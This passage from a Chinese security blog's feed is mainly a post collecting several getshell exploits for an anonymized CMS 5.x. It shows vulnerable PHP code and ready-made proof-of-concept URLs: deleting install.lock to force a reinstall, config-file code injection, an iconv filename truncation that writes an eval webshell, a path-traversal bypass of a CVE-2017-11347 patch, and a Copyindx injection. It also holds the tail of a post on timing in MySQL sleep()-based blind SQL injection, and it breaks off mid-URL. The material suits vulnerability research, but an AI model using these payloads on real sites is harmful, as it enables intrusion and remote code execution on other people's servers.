0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select <em> from ctf where userid&gt;100 and 1=sleep(1) or mood=0;延时2秒，执行select </em> from ctf where 1=sleep(1) and userid&gt;100 or mood=0;延时3秒，两者返回结果一致，但是由于执行顺序不同，导致延时不同。（前一种情况根据优先级，执行userid&gt;100 and 1=sleep(1)，通过userid&gt;100筛选只有两条记录，然后再sleep(1)，所以只延时2秒。后一种情况，根据优先级，执行1=sleep(1) and userid&gt;100，直接利用1=sleep(1)的条件和数据库记录对比以后，再判断userid&gt;100的条件，要全部比对执行三次，所以延时3秒。）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (2.00 sec)</span><br><span class="line">mysql&gt; select * from ctf where 1=sleep(1) and userid&gt;100 or mood=0;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>执行select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;延时0秒。<br>（userid&gt;100 and 1=sleep(1) or mood=0 or 1=1,在OR连接的语句中有恒成立的1=1，所以直接返回结果，没有延时。）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf where userid&gt;100 and 1=sleep(1) or mood=0 or 1=1;</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">|   1002 | test2    | test2     | 1    |</span><br><span class="line">|   1001 | test1    | test1     | 1    |</span><br><span class="line">|    100 | 32313333 | test      | 0    |</span><br><span class="line"><span class="code">+--------+</span>----------<span class="code">+-----------+</span>------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02小结"><a href="#0x02小结" class="headerlink" title="0x02小结"></a>0x02小结</h2><p>由于MySQL的条件优先级的不同，在不同语句中执行sleep()函数导致的延迟时间（执行次数）不同，一个比较简单的判断就是，判断sleep()函数所在的点，进行数据查询时需要对比的数据记录数，即等于sleep()函数执行的次数。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;代码审计发现了一个基于时间延迟的SQL盲注，但是发现 sleep(2)成功获取数据时页面返回时间均为4秒，即为设置时间的两倍，所以有了下面的分析。&lt;br&gt;
    
    </summary>
    
      <category term="数据库" scheme="http://blackwolfsec.cc/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Mysql" scheme="http://blackwolfsec.cc/tags/Mysql/"/>
    
      <category term="数据库" scheme="http://blackwolfsec.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>某CMS5.X版本GETSHELL漏洞合集-五连杀</title>
    <link href="http://blackwolfsec.cc/2018/03/13/5_x_getshell/"/>
    <id>http://blackwolfsec.cc/2018/03/13/5_x_getshell/</id>
    <published>2018-03-12T16:00:00.000Z</published>
    <updated>2018-04-25T00:54:00.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首发于：<a href="https://xz.aliyun.com/t/2096" target="_blank" rel="noopener">先知社区: 某CMS 5.X版本GETSHELL漏洞合集</a><br>2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。<br><a id="more"></a></p><h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p><h3 id="1-结合网上爆出某CMS-的后台任意文件删除漏洞"><a href="#1-结合网上爆出某CMS-的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出某CMS 的后台任意文件删除漏洞"></a>1. 结合网上爆出某CMS 的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure><p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/</span>app<span class="regexp">/batch/</span>csvup.php?fileField=<span class="number">1</span>_1231-<span class="number">1</span>&amp;flienamecsv=..<span class="regexp">/../</span>..<span class="regexp">/config/i</span>nstall.lock</span><br></pre></td></tr></table></figure></p><h3 id="2-重装时数据库配置文件过滤不当"><a href="#2-重装时数据库配置文件过滤不当" class="headerlink" title="2. 重装时数据库配置文件过滤不当"></a>2. 重装时数据库配置文件过滤不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'db_setup'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($setup==<span class="number">1</span>)&#123;</span><br><span class="line">            $db_prefix      = trim($db_prefix);</span><br><span class="line">            $db_host        = trim($db_host);</span><br><span class="line">            $db_username    = trim($db_username);</span><br><span class="line">            $db_pass        = trim($db_pass);</span><br><span class="line">            $db_name        = trim($db_name);</span><br><span class="line">            $config=<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">                   /*</span></span><br><span class="line"><span class="string">                   con_db_host = \"$db_host\"</span></span><br><span class="line"><span class="string">                   con_db_id   = \"$db_username\"</span></span><br><span class="line"><span class="string">                   con_db_pass    = \"$db_pass\"</span></span><br><span class="line"><span class="string">                   con_db_name = \"$db_name\"</span></span><br><span class="line"><span class="string">                   tablepre    =  \"$db_prefix\"</span></span><br><span class="line"><span class="string">                   db_charset  =  \"utf8\";</span></span><br><span class="line"><span class="string">                  */</span></span><br><span class="line"><span class="string">                  ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            $fp=fopen(<span class="string">"../config/config_db.php"</span>,<span class="string">'w+'</span>);</span><br><span class="line">            fputs($fp,$config);</span><br><span class="line">            fclose($fp);</span><br></pre></td></tr></table></figure><p>在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。</p><h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><p>数据库配置时修改任意参数为<code>*/phpinfo();/*</code>可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。<br>shell地址:<code>http://xxx.com/config/config_db.php</code></p><h2 id="0x02-iconv函数缺陷-条件竞争Getshell"><a href="#0x02-iconv函数缺陷-条件竞争Getshell" class="headerlink" title="0x02 iconv函数缺陷+条件竞争Getshell"></a>0x02 iconv函数缺陷+条件竞争Getshell</h2><p><em>前提:windows服务器+php版本&lt;5.4.0</em></p><h3 id="1-漏洞点"><a href="#1-漏洞点" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\admin\app\batch\csv.php</span></span><br><span class="line"></span><br><span class="line">fputcsv($fp,$fristarray); </span><br><span class="line">fputcsv($fp,$csvarray); </span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sqlzip=<span class="string">'csv.zip'</span>;</span><br><span class="line">$archive = <span class="keyword">new</span> PclZip($sqlzip);</span><br><span class="line">$zip_list = $archive-&gt;create(<span class="string">"./$title.csv"</span>);</span><br><span class="line">$cont  = iconv($codeold,$codenew,<span class="string">"&#123;$lang_csvexplain1&#125;\r\n&#123;$lang_csvexplain2&#125;\r\n&#123;$lang_csvexplain3&#125;\r\n&#123;$lang_csvexplain4&#125;"</span>);</span><br><span class="line">$fp = fopen(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>),w);</span><br><span class="line">fputs($fp, $cont);</span><br><span class="line">fclose($fp);</span><br><span class="line">$zip_list = $archive-&gt;add(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br><span class="line">@file_unlink(<span class="string">"./$title.csv"</span>);</span><br><span class="line">@file_unlink(iconv($codenew,$codeold,<span class="string">"./$title.csv"</span>));</span><br><span class="line">@file_unlink(iconv($codeold,$codenew,<span class="string">"./&#123;$lang_langshuom&#125;.txt"</span>));</span><br></pre></td></tr></table></figure><p>(1)文件名截断+任意内容写入</p><p>将lang_langshuom参数的值经过iconv转换后直接写文件，由于PHP版本&lt;5.4.0时,会忽略掉不认识的字符，所以可以控制文件名参数lang_langshuom生成php后缀文件，同时将lang_csvexplain1、lang_csvexplain2、lang_csvexplain3参数的内容写入文件，所以存在getshell的风险。</p><p>请求如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=tmp.php%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>(2)条件竞争</p><p>然而由于@file_unlink(iconv($codeold,$codenew,”./{$lang_langshuom}.txt”));会删除生成的shell文件，不能手动getshell，再次分析源码发现，此处为生成了shell文件，然后再删除。所以只要在删除前请求shell生成其他文件即可，即利用条件竞争，生成持久性webshell,写脚本即可实现。</p><h3 id="2-POC脚本"><a href="#2-POC脚本" class="headerlink" title="2. POC脚本"></a>2. POC脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure><p>修改参数后执行效果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br><span class="line">shell @ http://127.0.0.1/某CMS 5.3.19//admin/app/batch/shell.php</span><br></pre></td></tr></table></figure></p><p>ps:<br>利用php特性可以不用条件竞争，直接getshell<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/app/batch/csv.php?lang_title=11&amp;lang_langshuom=1.php/.%80&amp;lang_csvexplain1=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-CVE-2017-11347补丁绕过继续Getshell"><a href="#0x03-CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x03 CVE-2017-11347补丁绕过继续Getshell"></a>0x03 CVE-2017-11347补丁绕过继续Getshell</h2><p><em>前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）</em></p><h3 id="1-查找绝对路径的方法："><a href="#1-查找绝对路径的方法：" class="headerlink" title="1. 查找绝对路径的方法："></a>1. 查找绝对路径的方法：</h3><ul><li>利用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code></li><li>利用报错信息(<strong>信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页</strong>)<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/top.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>admin/box.php</span><br><span class="line"><span class="regexp">/app/</span>system<span class="regexp">/include/</span><span class="keyword">public</span><span class="regexp">/ui/</span>web/sidebar.php</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>5.3.19版本针对CVE-2017-11347的补丁分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($val[<span class="number">2</span>])&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      $address=<span class="string">"../about/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $address=<span class="string">"../news/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $address=<span class="string">"../product/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      $address=<span class="string">"../download/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      $address=<span class="string">"../img/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      $address=<span class="string">"../feedback/$fileaddr[1]"</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      $address = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line">   $newfile  =<span class="string">"../../../$val[1]"</span>; </span><br><span class="line">   <span class="keyword">if</span>($address != <span class="string">''</span>)&#123;</span><br><span class="line">      Copyfile($address,$newfile);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。</p><p>漏洞利用(网站安装在服务器根路径的情况)：</p><p>第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;<br>在后台”地址栏图标”处上传该文件。<br>得到地址为：<a href="http://localhost/upload/file/1506587082.ico" target="_blank" rel="noopener">http://localhost/upload/file/1506587082.ico</a></p><p>第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506587082.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\w</span>ww<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p><p>shell的地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/about/</span>shell.php</span><br></pre></td></tr></table></figure></p><h3 id="3-POC-注意左斜杠和右斜杠不能随意更改-："><a href="#3-POC-注意左斜杠和右斜杠不能随意更改-：" class="headerlink" title="3. POC(注意左斜杠和右斜杠不能随意更改)："></a>3. POC(注意左斜杠和右斜杠不能随意更改)：</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\上</span>传ico文件的相对路径/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\网</span>站index.php路径的上一层目录名<span class="symbol">\a</span>bout<span class="symbol">\w</span>ebshell的文件名|1</span><br></pre></td></tr></table></figure><p>特别注意其中的：“网站index.php上层目录名”，</p><p>1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”;  如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。</p><p>2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。</p><p>例如:网站搭建在:<a href="https://note.youdao.com/" target="_blank" rel="noopener">http://localhost/某CMS 5.3.19/</a>,则第二步的payload如下：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://localhost/某CMS 5.3.19/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..<span class="symbol">\u</span>pload<span class="symbol">\f</span>ile<span class="symbol">\1</span>506588072.ico/..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\某</span>CMS 5.3.19<span class="symbol">\a</span>bout<span class="symbol">\s</span>hell.php|1</span><br></pre></td></tr></table></figure></p><p>相应生成的shell地址为：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.19/</span>about<span class="regexp">/shell.php</span></span><br></pre></td></tr></table></figure></p><h2 id="0x04-Copyindx函数处理不当Getshell"><a href="#0x04-Copyindx函数处理不当Getshell" class="headerlink" title="0x04 Copyindx函数处理不当Getshell"></a>0x04 Copyindx函数处理不当Getshell</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p>此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347：<a href="https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：" target="_blank" rel="noopener">https://github.com/imp0wd3r/vuln-papers/tree/master/某CMS-5317-auth-rce漏洞十分相似，但是存在根本的差异，不同点如下：</a></p><p>（1）触发函数是Copyindex函数，而非Copyfile</p><p>（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入</p><p>（3）此漏洞Getshell不需要上传图片</p><p>（4）结合CSRF可以实现一键Getshell</p><h3 id="2-漏洞点"><a href="#2-漏洞点" class="headerlink" title="2. 漏洞点"></a>2. 漏洞点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin/app/physical/physical.php:197-236</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($op)&#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">if</span>(is_dir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]))&#123;</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> $lang_physicaldelok;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;unlink(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">echo</span> $lang_physicaldelok;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $adminfile=$url_array[count($url_array)<span class="number">-2</span>];</span><br><span class="line">      $strsvalto=readmin($val[<span class="number">1</span>],$adminfile,<span class="number">1</span>);</span><br><span class="line">      filetest(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      $dlappfile=parse_ini_file(<span class="string">'dlappfile.php'</span>,<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span>($dlappfile[$strsvalto][<span class="string">'dlfile'</span>])&#123;</span><br><span class="line">         $return=varcodeb(<span class="string">'app'</span>);</span><br><span class="line">         $checksum=$return[<span class="string">'md5'</span>];</span><br><span class="line">         $met_file=<span class="string">'/dl/app_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile($dlappfile[$strsvalto][<span class="string">'dlfile'</span>],<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $met_file=<span class="string">'/dl/olupdate_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile(<span class="string">"v$metcms_v/$strsvalto"</span>,<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>($stringfile==<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> $lang_physicalupdatesuc;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> dlerror($stringfile);</span><br><span class="line">         <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $fileaddr=explode(<span class="string">'/'</span>,$val[<span class="number">1</span>]);</span><br><span class="line">      $filedir=<span class="string">"../../../"</span>.$fileaddr[<span class="number">0</span>];  </span><br><span class="line">      <span class="keyword">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class="number">0777</span>); &#125; </span><br><span class="line">      <span class="keyword">if</span>($fileaddr[<span class="number">1</span>]==<span class="string">"index.php"</span>)&#123;</span><br><span class="line">         Copyindx(<span class="string">"../../../"</span>.$val[<span class="number">1</span>],$val[<span class="number">2</span>]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin/include/global.func.php:877-884</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">      $oldcont =<span class="string">"&lt;?php\n# 某CMS  Enterprise Content Management System \n# Copyright (C) 某CMS  Co.,Ltd (http://www.某CMS.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) 某CMS  Co., Ltd. (http://www.某CMS.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">      $fp = fopen($newindx,w);</span><br><span class="line">      fputs($fp, $oldcont);</span><br><span class="line">      fclose($fp);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.</p><h3 id="3-POC-xxx为任意的shell目录，index-php文件名不能修改"><a href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改" class="headerlink" title="3. POC(xxx为任意的shell目录，index.php文件名不能修改)"></a>3. POC(xxx为任意的shell目录，index.php文件名不能修改)</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>admin<span class="regexp">/app/</span>physical<span class="regexp">/physical.php?action=op&amp;op=3&amp;valphy=123|xxx/i</span>ndex.php|<span class="number">123</span>;phpinfo();?&gt;<span class="regexp">/*</span></span><br></pre></td></tr></table></figure><p>生成的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span 